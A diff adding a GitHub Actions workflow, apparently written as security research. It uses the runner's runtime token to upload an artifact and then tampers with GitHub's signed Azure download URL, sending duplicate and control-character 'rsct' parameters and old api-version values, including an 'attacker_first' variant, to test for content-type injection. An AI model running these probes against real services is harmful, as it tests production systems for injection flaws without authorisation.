@@ -1,0 +1,137 @@
+name: Repo Cassette Azure signed API version probe
+
+on:
+  workflow_dispatch:
+
+permissions:
+  actions: read
+
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Test signed Azure response Content-Type parsing
+        uses: actions/github-script@v7
+        env:
+          GITHUB_TOKEN: ${{ github.token }}
+        with:
+          script: |
+            const {createHash} = require('node:crypto');
+            const token = process.env.ACTIONS_RUNTIME_TOKEN;
+            const resultsUrl = process.env.ACTIONS_RESULTS_URL;
+            if (!token || !resultsUrl) throw new Error('Runtime artifact credentials unavailable');
+            const claims = JSON.parse(Buffer.from(token.split('.')[1], 'base64url').toString());
+            const scope = claims.scp.split(' ').find(s => s.startsWith('Actions.Results:'));
+            if (!scope) throw new Error('Actions.Results scope missing');
+            const [, runId, jobId] = scope.split(':');
+            const ids = {workflow_run_backend_id: runId, workflow_job_run_backend_id: jobId};
+            const service = new URL(resultsUrl).origin + '/twirp/github.actions.results.api.v1.ArtifactService/';
+            const name = `sas-rsct-${process.env.GITHUB_RUN_ID}.json`;
+            const body = Buffer.from('{"probe":"rsct"}');
+            const rpc = async (method, data) => {
+              const response = await fetch(service + method, {
+                method: 'POST',
+                headers: {Authorization: `Bearer ${token}`, 'Content-Type': 'application/json'},
+                body: JSON.stringify(data)
+              });
+              return {status: response.status, data: await response.json().catch(() => ({}))};
+            };
+            const created = await rpc('CreateArtifact', {
+              ...ids, name, version: 7, mime_type: 'application/json'
+            });
+            if (created.status !== 200 || created.data.ok !== true) {
+              throw new Error(`Create failed ${created.status}`);
+            }
+            const uploadUrl = created.data.signed_upload_url || created.data.signedUploadUrl;
+            const upload = await fetch(uploadUrl, {
+              method: 'PUT',
+              headers: {
+                'x-ms-blob-type': 'BlockBlob',
+                'x-ms-blob-content-type': 'application/json\u0085',
+                'x-ms-version': '2023-11-03',
+                'Content-Type': 'application/octet-stream'
+              },
+              body
+            });
+            if (!upload.ok) throw new Error(`Upload failed ${upload.status}`);
+            const hash = `sha256:${createHash('sha256').update(body).digest('hex')}`;
+            const finalized = await rpc('FinalizeArtifact', {
+              ...ids, name, size: String(body.length), hash
+            });
+            if (finalized.status !== 200 || finalized.data.ok !== true) {
+              throw new Error(`Finalize failed ${finalized.status}`);
+            }
+            const artifactId = finalized.data.artifact_id || finalized.data.artifactId;
+            const endpoint = `https://api.github.com/repos/${process.env.GITHUB_REPOSITORY}/actions/artifacts/${artifactId}/zip`;
+            const first = await fetch(endpoint, {
+              headers: {
+                Authorization: `Bearer ${process.env.GITHUB_TOKEN}`,
+                Accept: 'application/vnd.github.v3+json'
+              },
+              redirect: 'manual'
+            });
+            if (first.status !== 302) throw new Error(`Download API status ${first.status}`);
+            const signed = first.headers.get('location');
+            if (!signed) throw new Error('Signed download URL missing');
+            const originalRsct = new URL(signed).searchParams.get('rsct');
+            core.info(`SAS artifact_id=${artifactId} original_rsct=${JSON.stringify(originalRsct)}`);
+
+            const variants = [
+              ['baseline', signed],
+              ['api_2011_only', signed + '&api-version=2011-08-18'],
+              ['api_2012_only', signed + '&api-version=2012-02-12'],
+              ['api_2013_only', signed + '&api-version=2013-08-15'],
+              ['api_2014_only', signed + '&api-version=2014-02-14'],
+              ['duplicate_same', signed + '&rsct=application%2Fjson'],
+              ['duplicate_raw_nel', signed + '&rsct=application%2Fjson%85'],
+              ['duplicate_utf8_nel', signed + '&rsct=application%2Fjson%C2%85'],
+              ['duplicate_raw_fs', signed + '&rsct=application%2Fjson%1C'],
+              ['duplicate_uppercase', signed + '&RSCT=application%2Fjson%85'],
+              ['duplicate_encoded_key', signed + '&%72sct=application%2Fjson%85'],
+              ['duplicate_response_key', signed + '&response-content-type=application%2Fjson%85'],
+              ['semicolon_separator', signed + ';rsct=application%2Fjson%85'],
+              ['duplicate_api_version', signed + '&api-version=2012-02-12&rsct=application%2Fjson%85']
+            ];
+            for (const [label, url] of variants) {
+              try {
+                const response = await fetch(url, {redirect: 'manual'});
+                const type = response.headers.get('content-type') || '';
+                const hex = Buffer.from(type, 'latin1').toString('hex');
+                const errorCode = response.headers.get('x-ms-error-code') || '';
+                core.info(`SAS ${label} status=${response.status} type_latin1_hex=${hex} error_code=${errorCode}`);
+                await response.arrayBuffer();
+              } catch (error) {
+                core.info(`SAS ${label} exception=${String(error.message).slice(0, 100)}`);
+              }
+            }
+
+            for (const [label, suffix] of [
+              ['github_baseline', ''],
+              ['github_api_version', '?api-version=2012-02-12'],
+              ['github_rsct', '?rsct=application%2Fjson%85'],
+              ['github_both', '?api-version=2012-02-12&rsct=application%2Fjson%85']
+            ]) {
+              const response = await fetch(endpoint + suffix, {
+                headers: {
+                  Authorization: `Bearer ${process.env.GITHUB_TOKEN}`,
+                  Accept: 'application/vnd.github.v3+json'
+                }, redirect: 'manual'
+              });
+              const destination = response.headers.get('location');
+              const params = destination ? new URL(destination).searchParams : null;
+              core.info(`SAS ${label} api_status=${response.status} redirect_api_version=${JSON.stringify(params?.get('api-version') ?? null)} redirect_rsct=${JSON.stringify(params?.get('rsct') ?? null)} redirect_param_count=${params?.size ?? 0}`);
+              await response.arrayBuffer();
+            }
+
+            const reordered = new URL(signed);
+            reordered.searchParams.delete('rsct');
+            reordered.searchParams.append('rsct', 'application/json\u0085');
+            reordered.searchParams.append('rsct', originalRsct || 'application/json');
+            try {
+              const response = await fetch(reordered, {redirect: 'manual'});
+              const type = response.headers.get('content-type') || '';
+              core.info(`SAS attacker_first status=${response.status} type_latin1_hex=${Buffer.from(type, 'latin1').toString('hex')} error_code=${response.headers.get('x-ms-error-code') || ''}`);
+              await response.arrayBuffer();
+            } catch (error) {
+              core.info(`SAS attacker_first exception=${String(error.message).slice(0, 100)}`);
+            }
